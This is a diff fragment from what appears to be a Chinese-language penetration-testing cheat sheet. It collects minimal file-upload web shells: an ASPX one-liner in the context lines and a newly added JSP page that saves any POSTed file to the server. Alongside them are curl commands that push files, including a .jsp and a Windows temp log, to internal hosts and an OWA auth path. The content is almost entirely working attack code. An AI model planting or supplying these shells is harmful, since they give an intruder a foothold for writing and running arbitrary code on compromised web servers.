@@ -332,6 +332,15 @@ curl -k  -F "myfile=@t.txt" "http://127.0.0.1/owa/auth/3.aspx"   //-K 忽略证�
 <%@ Page Language="C#" %><% if (Request.Files.Count > 0) Request.Files[0].SaveAs(Server.MapPath("./" + Request.Files[0].FileName)); %>
 curl -X POST -F "file=@c:/windows/temp/vm.log" http://192.168.1.3/up.aspx
 
+jsp版本
+<%@ page import="java.io.*" %>
+<%
+if (request.getMethod().equals("POST")) {
+    request.getPart("f").write(request.getPart("f").getSubmittedFileName());
+}
+%>
+curl -F "f=@/tmp/a.jsp" http://192.168.1.2/upload.jsp
+
 jsp 版本1
 <%@ page import="java.io.*, javax.servlet.http.Part" %>
 <%
